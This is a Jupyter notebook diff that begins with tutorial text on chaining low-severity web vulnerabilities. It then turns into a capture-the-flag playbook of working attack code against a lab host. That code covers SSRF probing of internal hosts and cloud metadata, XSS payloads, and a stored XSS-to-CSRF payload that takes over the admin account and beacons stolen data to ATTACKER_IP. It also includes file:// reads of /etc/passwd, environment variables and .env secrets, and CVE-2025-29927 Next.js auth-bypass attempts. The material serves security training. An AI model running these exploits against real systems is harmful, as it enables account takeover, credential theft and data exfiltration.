@@ -1,0 +1,747 @@
+=== Cell 0 [markdown] id=f7d3b661 ===
+Introduction
+
+When we talk about vulnerability chaining, we're referring to the idea that a single bug on its own might not seem like a big deal, but when combined with others, it can become dangerous. This is how real-world attackers think: not every vulnerability needs to be critical, as long as it helps them move forward. In fact, attackers often rely on several "low-risk" or "medium-risk" issues to gradually work their way to a serious compromise.
+
+This brings us to something important that's often overlooked when reading pentest reports: risk ratings are assigned per vulnerability in isolation. Organisations usually focus on remediating the criticals and highs, while deferring or accepting mediums and lows. But this mindset can be misleading. A medium-risk vulnerability like verbose error messages or weak password policy might not get immediate attention, but when chained together with other issues like missing protection or , it could lead to a much higher-impact exploit. Sometimes, chaining multiple medium-rated issues results in a more damaging outcome than a single high-risk finding would have caused on its own.
+
+This room will walk you through how attackers approach an application holistically, looking for anything they can use, combining findings, and building on their access step by step. You'll go beyond checking for individual bugs and start recognising how everything fits together from an attacker's point of view.
+Objectives
+
+By the end of this room, you'll be able to:
+
+    Think like an attacker: Learn how to treat even small findings as potential stepping stones.
+    Understand common chains: Some bugs naturally pair well together. You'll learn why.
+    Recognise weak boundaries: Identify where trust breaks down between different parts of a web application.
+    Follow a real chain: You'll go from first access to remote code execution by chaining multiple low-to-medium severity issues.
+
+Pre-requisites
+
+Before starting this room, you should already be familiar with the fundamentals of web application security, including vulnerabilities like:
+
+    Cross-Site Scripting ()
+    Cross-Site Request Forgery ()
+    Weak authentication and session management
+
+If you haven't already, we strongly recommend completing the Web Application Pentesting learning pathway first, as this room builds directly on concepts introduced there.
+
+What is Vulnerability Chaining?
+
+Vulnerability chaining is when two or more individual weaknesses are combined to cause greater damage than they could alone. Think of it like this: one vulnerability gets your foot in the door, another gives you access to sensitive functionality, and a third might let you execute code or exfiltrate data. None of them are particularly dangerous on their own, but together, they're powerful.
+
+Let's look at a better example. Imagine you find a Self- vulnerability in a user profile editor, the kind where the payload only runs in your own browser. On its own, that's pretty limited; you can't use it to target anyone else. But now imagine that the application also lacks protection. You craft a payload that forces an authenticated victim (like an admin) to unknowingly save your Self- payload into their own profile. Later, when the admin views or edits their profile, the fires, and now you've got code execution in their browser. Neither the Self- nor the missing were critical on their own, but chained together, they give you full access to someone else's session.
+
+This is the essence of chaining: connecting lower-severity vulnerabilities to achieve something much more impactful.
+Why This Matters in the Real World
+
+In real-world attacks, this approach is more common than most people expect. One of the best-known examples is the Capital One breach in 2019. The attacker didn't rely on a critical zero-day. Instead, they began with a Server-Side Request Forgery () vulnerability. On its own, that bug only allowed them to make requests from the server. However, that was enough to access the metadata service, retrieve credentials, and use those credentials to download sensitive files from an bucket. None of these issues were individually critical, but the way they were chained led to a massive data breach.
+
+Another common scenario: an attacker finds a page vulnerable to Injection, but it's behind a login. They also notice that the login form gives away whether a username exists, and that there's no limit on login attempts. Using this, they discover a valid username, brute-force the weak password, and log in. Now authenticated, they exploit the to dump data or escalate privileges. Again, no single issue here is a guaranteed entry point, but together they build a clear path to compromise.
+
+Why Patch-by-Patch Fixes Aren't Enough
+
+It's common for development teams to fix vulnerabilities one at a time, treating them as isolated problems. They patch the , but leave the account enumeration alone. Or they fix a file upload issue, but leave the that lets you abuse the upload feature. These fixes might close individual doors, but they don't address the bigger picture, the system is still vulnerable because the connections between these bugs were never considered.
+
+That's why security needs to be approached holistically. Vulnerability chaining isn't some edge case; it's how real attacks happen. Attackers aren't playing fair, and they aren't following your bug tracker. They're looking for whatever combination of flaws gets them to their goal, whether that's access, , or data.
+
+How to Think Like an Attacker
+
+A skilled attacker rarely finds a single vulnerability and immediately wins. Instead, they explore the application like a curious user, identify small cracks, and slowly build up a path to their objective. The real power of chaining vulnerabilities comes from understanding how they interact, not just spotting them in isolation.
+
+This section introduces a repeatable process to help you think like an attacker. You'll learn how to map out an application, identify potential weaknesses, and combine them to achieve a larger goal, just like an adversary would.
+
+Step 1: Use the Application Like a Normal User
+
+Before anything else, explore the application with no assumptions. Register an account, log in, click around, and understand what features are available. Don't go hunting for bugs yet. Just get a feel for the flow, the user roles, and where sensitive actions happen (e.g. account settings, admin features, uploads).
+
+Step 2: Enumerate and Find Weaknesses
+
+Now shift your focus to identifying weak spots. These might be classic vulnerabilities like , , or , or subtler behaviours like inconsistent error messages, user ID patterns in URLs, or file uploads that allow weird extensions.
+
+At this point, list all potential findings, even if they seem low-risk.
+
+Step 3: Understand What Each Finding Enables
+
+Once you've got a handful of weaknesses, assess them in isolation. Ask yourself:
+"What can I do with this if I assume nothing else is broken?"
+
+    Does this run in a useful context?
+    Can this verbose login help with username enumeration?
+    Will this file upload let me drop a script somewhere?
+
+You're trying to understand the standalone potential of each issue.
+
+Step 4: Think Like an Attacker, What's the Goal?
+
+Now ask: What would an attacker want to do with this application?
+
+    Steal sensitive data?
+    Access an admin panel?
+    Escalate to remote code execution?
+
+Context matters. An on a blog might be annoying, but on a banking dashboard? That's a very different threat.
+
+Step 5: Build a Path from Weaknesses to Objective
+
+This is where you connect the dots. Look at your list of vulnerabilities and imagine a logical path from an external user to the attacker's goal.
+
+Example:
+
+    Verbose login → valid usernames → weak password policy → login → stored → admin visits → fires → admin cookie theft → privilege escalation
+
+The key is mapping out the exploit path step by step.
+
+Step 6: Execute and Validate Each Step
+
+Walk the chain in order. Don't assume something will work; test it.
+
+    Can you brute-force a password?
+    Does your trigger in the right context?
+    Will the stolen cookie actually let you access the admin dashboard?
+
+This also helps uncover blockers or dependencies. Maybe the only works on certain pages, or the login brute-force fails because of rate limiting.
+
+Step 7: Report the Full Chain
+
+When reporting, don't isolate the bugs. Tell the full story.
+
+Start with "an unauthenticated attacker can do X", and walk through the chain clearly. Make it obvious that the risk comes not from one bug, but from how they interact.
+
+Also, be clear about the impact escalation:
+"While each individual issue might be low or medium risk, together they result in full compromise of the system."
+
+=== Cell 1 [markdown] id=46e81f08 ===
+One of the most important things to understand about vulnerability chaining is that it rarely follows a neat, straight line. When you're working through a real-world application, you'll often find that your first planned chain hits a wall. Maybe the developer actually did fix part of the issue, or maybe the environment is slightly different from what you expected. This is where creativity and flexibility make the difference between getting stuck and finding another way forward.
+When the Chain Isn't Linear
+
+In the previous task, we walked through a chain that went something like this: log in with a default password → exploit → trigger → change admin email and password → gain admin. It reads nicely, but reality often throws in complications.
+
+Suppose the application did have tokens in place and your attempt to change the admin's email silently failed. Does this make your useless? Far from it. A creative attacker wouldn't give up; they'd think about what else that could do. Could you steal the admin's ? Could you trick them into making a GET request that leaks sensitive information through a different vector? Could you use it to fingerprint what browser or plugins the admin uses, or force their browser to carry out another action on your behalf?
+
+This is where the attacker mindset shines through. The question isn't "does this work as I planned?" but "what else can I do with the access I have?"
+
+Experienced attackers always think in terms of pivot points. When you plan out a chain, don't just focus on one path to success. Think about alternatives if part of your plan fails. If the trick doesn't work, can you use in a different way? If isn't exploitable for auth bypass, could it still dump useful data that helps with password guessing?
+
+A good habit is to mentally map out, or even sketch, the different pivots and fallback options as you discover them. This helps you stay structured in your approach, even when the target doesn't behave how you expect.
+
+Red Team vs Bug Bounty: Different Endgames
+
+It's also worth understanding that your goal can shape how you think about chaining. On a red team engagement, your job is to demonstrate impact holistically. You want to follow the chain as far as you can, ideally reaching your objective (such as domain admin or sensitive data access) without being detected. This means you might actually use your chain to pivot into internal systems, move laterally, or establish .
+
+On a bug bounty, the goal is different. Your job is to clearly show the risk and potential impact so the company can fix it. Sometimes, that means stopping before full exploitation because the report itself is enough to prove the point. For example, showing that you could change the admin's email or that you could dump user data through is usually enough, you don't need to go further.
+Aspect 	Red Team Engagement 	Bug Bounty Program
+Primary Goal 	Demonstrate real-world impact, identify gaps in the organisation's security posture 	Communicate risk clearly to the vendor
+Chaining 	Used to pivot, escalate, and achieve access 	Used to show how multiple bugs combine
+Execution Style 	Stealthy, often avoids detection 	Transparent, designed to be reproducible
+End Objective 	Achieve defined goal (e.g., data exfil, DA) 	Submit a valid, impactful report
+Level of Exploitation 	Full chain executed if possible 	Partial exploitation is fine if risk is clear
+Quality 	May use real tools or simulate ops activity 	Requires clean, minimal, and safe reproduction
+
+Understanding the difference between these two perspectives helps you decide how much of the chain you need to build out and what level of evidence is appropriate.
+
+Vulnerability chaining is less about technical skill and more about curiosity and adaptability. Applications aren't perfect, but they're also not perfectly broken in predictable ways.
+
+By now, you've seen first-hand how vulnerabilities that might seem low-risk on their own can combine to cause serious damage. The key lesson from this walkthrough isn't just that a default password, an , or a missing token are problems, it's that, together, they can lead all the way from a low-privileged account to full system compromise. Chaining is what turns small cracks into a breach.
+
+One of the most important things to remember is that vulnerability chaining is about context, observation, and creativity. Each step in the chain worked because you spotted an opportunity and thought about what it could give you next. That's what real attackers do: they follow the path the system unintentionally lays out for them, looking for ways to pivot and escalate at every turn.
+
+It's easy to get caught up in hunting for individual bugs, but chaining is what shows the real risk. That's why in professional penetration tests and red team exercises, reports highlight how weaknesses combine, not just how they stand on their own. This mindset helps both attackers and defenders understand what needs to be fixed to truly reduce risk.
+
+The next step is to apply what you've learned in other challenge rooms within this module. Now that you've seen how the process works, have a go at identifying your own chains. Remember: don't just look for the critical bug, look for how small things fit together.
+
+=== Cell 2 [code] id=a28aaf2a ===
+
+
+=== Cell 3 [markdown] id=d0c3cb87 ===
+## CTF Playbook: XSS/CSRF Chaining
+
+This section is a reusable workflow for the TryBookMe-style challenge.
+
+### Goal
+- Identify and chain web vulnerabilities (XSS, CSRF, auth/session flaws)
+- Extract two flags in the format `THM{...}`
+
+### Workflow
+1. Define target and scope
+2. Run endpoint recon
+3. Build and validate payload variants
+4. Test session/cookie/token behavior
+5. Run flag extraction against candidate responses
+
+Update the `TARGET_BASE` value in the next cell before running.
+
+=== Cell 4 [code] id=afe96172 ===
+import re
+import json
+import urllib.parse
+from dataclasses import dataclass
+from typing import List, Dict, Any
+
+import requests
+
+TARGET_BASE = "http://10.82.159.192"
+SSRF_PREVIEW = f"{TARGET_BASE}/preview.php"
+INTERNAL_HOST = "cvssm1"
+TIMEOUT = 8
+
+FLAG_RE = re.compile(r"THM\{[^}]+\}")
+
+print("Configured target:", TARGET_BASE)
+print("SSRF endpoint:", SSRF_PREVIEW)
+print("Internal host:", INTERNAL_HOST)
+
+=== Cell 5 [code] id=c50a780e ===
+def preview_fetch(target_url: str, timeout: int = TIMEOUT):
+    q = urllib.parse.quote(target_url, safe="")
+    url = f"{SSRF_PREVIEW}?url={q}"
+    r = requests.get(url, timeout=timeout)
+    return {
+        "request_url": url,
+        "status": r.status_code,
+        "length": len(r.text),
+        "headers": dict(r.headers),
+        "text": r.text,
+    }
+
+
+def quick_recon(paths=None):
+    if paths is None:
+        paths = [
+            "/",
+            "/server-status",
+            "/server-status?auto",
+            "/robots.txt",
+            "/admin",
+            "/login",
+            "/premium",
+            "/library",
+            "/flag",
+            "/preview.php",
+        ]
+
+    rows = []
+    for p in paths:
+        t = f"http://{INTERNAL_HOST}{p}"
+        try:
+            res = preview_fetch(t)
+            sample = " ".join(res["text"].split())[:140]
+            rows.append({
+                "path": p,
+                "status": res["status"],
+                "length": res["length"],
+                "sample": sample,
+            })
+        except Exception as exc:
+            rows.append({
+                "path": p,
+                "status": "ERR",
+                "length": 0,
+                "sample": str(exc)[:140],
+            })
+
+    for row in rows:
+        print(f"{row['path']:22} {str(row['status']):>4} len={row['length']:5}  {row['sample']}")
+
+    return rows
+
+
+_ = quick_recon()
+
+=== Cell 6 [code] id=a7d72b7f ===
+XSS_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "\"><script>fetch('/update_email.php',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=pwned@evil.local&password=test'})</script>",
+]
+
+CSRF_FORMS = [
+    "email=pwnedadmin@evil.local&password=pwnedadmin",
+    "email=admin+takeover@evil.local&password=admin123",
+]
+
+print("XSS payload candidates:")
+for i, p in enumerate(XSS_PAYLOADS, 1):
+    enc = urllib.parse.quote(p)
+    print(f"[{i}] raw : {p[:120]}")
+    print(f"    enc : {enc[:140]}")
+
+print("\nCSRF body candidates:")
+for i, b in enumerate(CSRF_FORMS, 1):
+    print(f"[{i}] {b}")
+
+=== Cell 7 [code] id=99973bd3 ===
+def extract_csrf_token(html: str):
+    patterns = [
+        r'name=["\']csrf(?:_token)?["\']\s+value=["\']([^"\']+)["\']',
+        r'value=["\']([^"\']+)["\']\s+name=["\']csrf(?:_token)?["\']',
+        r'csrf(?:_token)?\s*[:=]\s*["\']([^"\']+)["\']',
+    ]
+    for pat in patterns:
+        m = re.search(pat, html, re.IGNORECASE)
+        if m:
+            return m.group(1)
+    return None
+
+
+def session_probe():
+    s = requests.Session()
+
+    homepage = s.get(TARGET_BASE + "/", timeout=TIMEOUT)
+    csrf = extract_csrf_token(homepage.text)
+
+    print("Homepage status:", homepage.status_code)
+    print("Cookies:", s.cookies.get_dict())
+    print("CSRF token:", csrf)
+
+    candidates = ["/", "/preview.php", "/server-status", "/admin", "/flag"]
+    for p in candidates:
+        try:
+            r = s.get(TARGET_BASE + p, timeout=TIMEOUT)
+            print(f"GET {p:14} -> {r.status_code:3} len={len(r.text):5}")
+        except Exception as exc:
+            print(f"GET {p:14} -> ERR {str(exc)[:80]}")
+
+    return s
+
+
+session = session_probe()
+
+=== Cell 8 [code] id=2ccee6ca ===
+def find_flags_in_text(text: str):
+    return sorted(set(FLAG_RE.findall(text or "")))
+
+
+def hunt_flags(targets=None):
+    if targets is None:
+        targets = [
+            f"http://{INTERNAL_HOST}/",
+            f"http://{INTERNAL_HOST}/flag",
+            f"http://{INTERNAL_HOST}/admin",
+            f"http://{INTERNAL_HOST}/premium",
+            f"http://{INTERNAL_HOST}/server-status",
+            "http://169.254.169.254/latest/user-data",
+        ]
+
+    all_flags = set()
+
+    for t in targets:
+        try:
+            res = preview_fetch(t)
+            flags = find_flags_in_text(res["text"])
+            if flags:
+                print(f"[+] {t}")
+                for f in flags:
+                    print("   ", f)
+                    all_flags.add(f)
+            else:
+                print(f"[-] {t} (no flag, len={res['length']})")
+        except Exception as exc:
+            print(f"[!] {t} -> {str(exc)[:120]}")
+
+    print("\n=== Unique flags ===")
+    if not all_flags:
+        print("No THM{...} found yet")
+    else:
+        for f in sorted(all_flags):
+            print(f)
+
+    return sorted(all_flags)
+
+
+found_flags = hunt_flags()
+
+=== Cell 9 [markdown] id=fa7b75eb ===
+## Next Manual Step (Browser)
+
+If automation still does not return both flags, use this order:
+
+1. Open the app and identify any field that renders user content (review/comment/title/url)
+2. Inject one XSS payload that triggers a same-origin CSRF action (for example an email/profile/admin update request)
+3. Re-open privileged pages and re-run the Flag Hunter cell
+4. Save the final two values in this notebook under:
+   - First flag: `THM{...}`
+   - Second flag: `THM{...}`
+
+=== Cell 10 [code] id=f795af2e ===
+# One-cell end-to-end helper:
+# 1) SSRF/preview discovery + flag hunting
+# 2) Generate robust stored-XSS->CSRF payload for admin-context trigger
+
+import re
+import zlib
+import urllib.parse
+import requests
+
+PREVIEW_CANDIDATES = [
+    "http://10.82.159.192/preview.php",
+    "http://10.82.161.205/preview.php",
+]
+TIMEOUT = 10
+FLAG_RE = re.compile(r"THM\{[^}]+\}")
+
+
+def choose_preview_endpoint():
+    for endpoint in PREVIEW_CANDIDATES:
+        test_target = "http://cvssm1/"
+        q = urllib.parse.quote(test_target, safe="")
+        u = f"{endpoint}?url={q}"
+        try:
+            r = requests.get(u, timeout=5)
+            if r.status_code == 200 and len(r.text) > 0:
+                print(f"[+] Using preview endpoint: {endpoint}")
+                return endpoint
+        except Exception:
+            continue
+    raise RuntimeError("No preview endpoint reachable. Check if the THM machine is running.")
+
+
+PREVIEW = choose_preview_endpoint()
+
+
+def preview_fetch(target_url: str, timeout: int = TIMEOUT):
+    q = urllib.parse.quote(target_url, safe="")
+    u = f"{PREVIEW}?url={q}"
+    r = requests.get(u, timeout=timeout)
+    return r.status_code, r.headers, r.content, r.text, u
+
+
+def find_flags_in_bytes(data: bytes):
+    hits = set()
+
+    try:
+        text = data.decode("utf-8", errors="ignore")
+        hits.update(FLAG_RE.findall(text))
+    except Exception:
+        pass
+
+    ascii_text = "".join(chr(b) if 32 <= b < 127 else " " for b in data)
+    hits.update(FLAG_RE.findall(ascii_text))
+
+    for m in re.finditer(rb"stream\r?\n", data):
+        start = m.end()
+        end = data.find(b"endstream", start)
+        if end == -1:
+            continue
+        chunk = data[start:end].strip(b"\r\n")
+        if not chunk:
+            continue
+
+        for candidate in (chunk, b"x\x9c" + chunk):
+            try:
+                dec = zlib.decompress(candidate)
+                t = dec.decode("utf-8", errors="ignore")
+                hits.update(FLAG_RE.findall(t))
+            except Exception:
+                pass
+
+    return sorted(hits)
+
+
+def print_result(label: str, status: int, headers, body: bytes, text: str, req_url: str):
+    ctype = headers.get("Content-Type", "") if headers else ""
+    sample = " ".join((text or "").split())[:150]
+    print(f"\n[{label}]\n status={status} len={len(body)} ctype={ctype}")
+    print(f" req={req_url[:140]}")
+    print(f" sample={sample}")
+
+
+def build_auto_xss_csrf_payload(attacker_log_url: str = "http://ATTACKER_IP:8000/log"):
+    # This payload runs automatically (no click), tries multiple likely profile/admin update endpoints,
+    # and attempts to exfiltrate discovered THM flags to your listener.
+    endpoints_js = "['/update_email.php','/profile/update','/account/update','/admin/update_email.php','/api/profile/update','/api/user/update']"
+    reads_js = "['/admin','/flag','/premium','/dashboard','/profile','/']"
+
+    payload = (
+        "<img src=x onerror=\"(async()=>{"
+        "const eps=" + endpoints_js + ";"
+        "const readP=" + reads_js + ";"
+        "const tEl=document.querySelector('input[name=csrf_token],input[name=csrf],input[name=_token]');"
+        "const tok=tEl?tEl.value:'';"
+        "const bodies=["
+        "'email=pwnedadmin@evil.local&password=Admin123!',"
+        "'email=admin_takeover@evil.local&password=Admin123!',"
+        "'username=admin&email=pwnedadmin@evil.local&password=Admin123!'"
+        "];"
+        "for(const ep of eps){for(const b of bodies){"
+        "let body=b;"
+        "if(tok&&!/csrf|_token/i.test(body)){body+='&csrf_token='+encodeURIComponent(tok);}"
+        "try{await fetch(ep,{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body});}catch(e){}"
+        "}}"
+        "let all='';"
+        "for(const rp of readP){"
+        "try{const r=await fetch(rp,{credentials:'include'});const tx=await r.text();all+='\\n'+tx;}catch(e){}"
+        "}"
+        "const m=all.match(/THM\\{[^}]+\\}/g)||[];"
+        "const uniq=[...new Set(m)];"
+        "if(uniq.length){(new Image()).src='" + attacker_log_url + "?f='+encodeURIComponent(uniq.join(','));}"
+        "else{(new Image()).src='" + attacker_log_url + "?s=no_flag_yet';}"
+        "})()\">"
+    )
+    return payload
+
+
+all_flags = set()
+
+print("== Step 1: Home page and embedded PDF links ==")
+st, h, b, t, ru = preview_fetch("http://cvssm1/")
+print_result("cvssm1/", st, h, b, t, ru)
+
+pdf_links = sorted(set(re.findall(r"openPdf\('([^']+)'\)", t)))
+print("\nFound PDF links:")
+for p in pdf_links:
+    print(" -", p)
+
+print("\n== Step 2: Pull known PDFs through preview.php ==")
+for p in pdf_links:
+    st, h, b, t, ru = preview_fetch(p)
+    print_result(p, st, h, b, t, ru)
+    flags = find_flags_in_bytes(b)
+    if flags:
+        print(" FLAGS:", flags)
+        all_flags.update(flags)
+
+print("\n== Step 3: Fuzz likely hidden PDF names ==")
+base_pdf = "http://cvssm1/pdf/"
+candidates = [
+    "premium.pdf", "secret.pdf", "flag.pdf", "flags.pdf", "admin.pdf",
+    "private.pdf", "internal.pdf", "backup.pdf", "notes.pdf", "todo.pdf",
+    "secrets.pdf", "book3.pdf", "book4.pdf", "extract.pdf", "room.pdf",
+    "premium-room.pdf", "library-secrets.pdf", "confidential.pdf"
+]
+for name in candidates:
+    target = base_pdf + name
+    st, h, b, t, ru = preview_fetch(target)
+    if st == 200 and len(b) not in (0, 268, 275):
+        print_result(target, st, h, b, t, ru)
+        flags = find_flags_in_bytes(b)
+        if flags:
+            print(" FLAGS:", flags)
+            all_flags.update(flags)
+
+print("\n== Step 4: SSRF checks for common internal files ==")
+ssrf_targets = [
+    "http://169.254.169.254/latest/user-data",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://cvssm1/server-status?auto",
+    "http://cvssm1/.badr-info",
+    "http://cvssm1/flag",
+    "http://cvssm1/admin",
+]
+for target in ssrf_targets:
+    try:
+        st, h, b, t, ru = preview_fetch(target)
+        print_result(target, st, h, b, t, ru)
+        flags = find_flags_in_bytes(b)
+        if flags:
+            print(" FLAGS:", flags)
+            all_flags.update(flags)
+    except Exception as exc:
+        print(f"\n[{target}] ERR: {exc}")
+
+print("\n== Step 5: Auto-XSS->CSRF payload generator ==")
+payload = build_auto_xss_csrf_payload("http://127.0.0.1:8000/log")
+print("Copy this payload into your injectable field (stored XSS):\n")
+print(payload)
+print("\nURL-encoded variant:\n")
+print(urllib.parse.quote(payload, safe=""))
+
+print("\n== Final flags ==")
+if not all_flags:
+    print("No THM{...} found yet.")
+    print("Next: inject printed payload, wait for admin/bot view, then rerun this same cell.")
+else:
+    for f in sorted(all_flags):
+        print(f)
+
+=== Cell 11 [code] id=fdffc8ae ===
+
+
+=== Cell 12 [markdown] id=e5158cb3 ===
+## CVE-2025-29927 + SSRF File:// LFI Chain
+
+**Hypothesis**: `preview.php` passes the `url=` param to a server-side fetcher (curl/file_get_contents)
+without sanitising the scheme, so `file://` reads local files.
+
+**CVE-2025-29927** = Next.js middleware auth bypass via the internal header:
+```
+x-middleware-subrequest: middleware
+```
+If there is a Next.js app running internally (port 3000 / 3001), adding that header skips all
+middleware auth checks — giving direct access to protected routes (admin panels, API endpoints).
+
+### Attack chain
+1. LFI via `file://` → read `/etc/passwd`, app configs, `.env`, private keys
+2. Find Next.js internal port from config / process list
+3. Pivot: SSRF to internal Next.js + `x-middleware-subrequest` header → bypass auth → admin access
+4. Extract flags
+
+=== Cell 13 [code] id=f41cd091 ===
+import requests
+import urllib.parse
+import re
+
+PREVIEW = "http://10.82.159.192/preview.php"
+FLAG_RE = re.compile(r"THM\{[^}]+\}")
+
+
+def lfi_fetch(path: str):
+    """Read a local file via file:// SSRF through preview.php."""
+    url = f"file://{path}"
+    q = urllib.parse.quote(url, safe="")
+    r = requests.get(f"{PREVIEW}?url={q}", timeout=8)
+    return r.status_code, r.text
+
+
+# --- Files to read ---
+LFI_TARGETS = [
+    "/etc/passwd",
+    "/etc/hostname",
+    "/proc/version",
+    "/proc/net/tcp",          # open ports (hex)
+    "/proc/self/environ",     # env vars: DB creds, secrets
+    "/proc/self/cmdline",     # what process is running
+    "/home/user/.env",
+    "/var/www/html/.env",
+    "/var/www/html/config.php",
+    "/var/www/html/preview.php",   # source of the SSRF
+    "/etc/apache2/sites-enabled/000-default.conf",
+    "/etc/nginx/nginx.conf",
+    "/etc/nginx/sites-enabled/default",
+    "/var/www/html/db.php",
+    "/var/www/html/config.inc.php",
+    "/root/.env",
+    "/root/flag.txt",
+    "/home/user/flag.txt",
+    "/flag.txt",
+    "/flag",
+]
+
+print(f"SSRF endpoint : {PREVIEW}")
+print(f"Scheme tested : file://\n")
+
+lfi_results = {}
+for path in LFI_TARGETS:
+    try:
+        status, text = lfi_fetch(path)
+        snippet = " ".join(text.split())[:200] if text else ""
+        flags = FLAG_RE.findall(text)
+        marker = "[FLAG!]" if flags else ""
+        nonempty = status == 200 and len(text.strip()) > 0
+        if nonempty:
+            print(f"[+] {path}  ({status}, {len(text)} bytes) {marker}")
+            print(f"    {snippet[:180]}")
+            if flags:
+                for f in flags:
+                    print(f"    >>> {f}")
+        else:
+            print(f"[-] {path}  ({status}, empty/blocked)")
+        lfi_results[path] = {"status": status, "text": text, "flags": flags}
+    except Exception as e:
+        print(f"[!] {path}  ERR: {e}")
+        lfi_results[path] = {"status": "ERR", "text": "", "flags": []}
+
+=== Cell 14 [code] id=37a33f52 ===
+# Print the full source of preview.php so we can understand exactly what it fetches
+# and what other endpoints / parameters exist.
+
+src_path = "/var/www/html/preview.php"
+st, src = lfi_fetch(src_path)
+if src.strip():
+    print(f"=== {src_path} ({st}) ===")
+    print(src)
+else:
+    # Try common alternative webroot paths
+    for alt in [
+        "/var/www/html/app/preview.php",
+        "/srv/www/preview.php",
+        "/opt/app/preview.php",
+        "/app/preview.php",
+    ]:
+        st2, src2 = lfi_fetch(alt)
+        if src2.strip():
+            print(f"=== {alt} ({st2}) ===")
+            print(src2)
+            break
+    else:
+        print("preview.php source not found via LFI")
+
+=== Cell 15 [code] id=8e3c7311 ===
+# CVE-2025-29927 — Next.js middleware auth bypass
+# If an internal Next.js service exists, the x-middleware-subrequest header
+# causes middleware.ts/js to believe the request originates from Next.js itself,
+# so all auth/redirect middleware checks are skipped.
+
+# Step 1: probe likely internal Next.js ports via SSRF
+internal_base = "http://cvssm1"   # adjust to internal hostname/IP
+nextjs_ports = [3000, 3001, 3002, 8080, 8443, 4000]
+
+print("=== Probing for internal Next.js service ===")
+nextjs_live = []
+for port in nextjs_ports:
+    target = f"{internal_base}:{port}/"
+    try:
+        q = urllib.parse.quote(target, safe="")
+        r = requests.get(f"{PREVIEW}?url={q}", timeout=6)
+        body_snip = " ".join(r.text.split())[:140]
+        is_next = any(x in r.text for x in ["__NEXT_DATA__", "_next/", "next-route", "buildId"])
+        tag = "[NEXT.JS!]" if is_next else ""
+        if r.status_code == 200 and r.text.strip():
+            print(f"[+] port {port}: {tag}  {body_snip}")
+            nextjs_live.append((port, is_next))
+        else:
+            print(f"[-] port {port}: {r.status_code}")
+    except Exception as e:
+        print(f"[!] port {port}: {e}")
+
+# Step 2: for each live Next.js port, hit admin/protected routes with bypass header
+# The trick: send the header directly via the SSRF is not possible (preview.php controls headers).
+# INSTEAD: try to read the Next.js app source via LFI to find the admin route,
+# then hit it directly from this machine with the bypass header.
+
+BYPASS_HEADER = "x-middleware-subrequest"
+# Value must match the middleware file path used by the app, common values:
+BYPASS_VALUES = [
+    "middleware",
+    "src/middleware",
+    "middleware:middleware:middleware:middleware:middleware",
+]
+
+protected_routes = [
+    "/admin",
+    "/admin/dashboard",
+    "/dashboard",
+    "/api/admin",
+    "/api/flag",
+    "/flag",
+    "/premium",
+]
+
+print("\n=== CVE-2025-29927 Direct Bypass Attempts ===")
+TARGET_BASE = "http://10.82.159.192"   # outer IP — in case Next.js is on the same host
+
+bypass_flags = set()
+for bval in BYPASS_VALUES:
+    for route in protected_routes:
+        url = f"{TARGET_BASE}{route}"
+        try:
+            r = requests.get(url, headers={BYPASS_HEADER: bval}, timeout=8, allow_redirects=True)
+            flags = FLAG_RE.findall(r.text)
+            snip = " ".join(r.text.split())[:120]
+            if flags:
+                print(f"[FLAG!] {route}  header={bval}")
+                for f in flags:
+                    print(f"  >>> {f}")
+                    bypass_flags.add(f)
+            elif r.status_code not in (404, 301, 302):
+                print(f"[?] {route:28} {r.status_code:3}  hdr={bval[:30]}  {snip}")
+        except Exception as e:
+            pass  # silently skip connection errors
+
+print("\n=== Bypass flags ===")
+if bypass_flags:
+    for f in sorted(bypass_flags):
+        print(f)
+else:
+    print("None yet — check if Next.js port differs. Use lfi_results to inspect configs.")
+
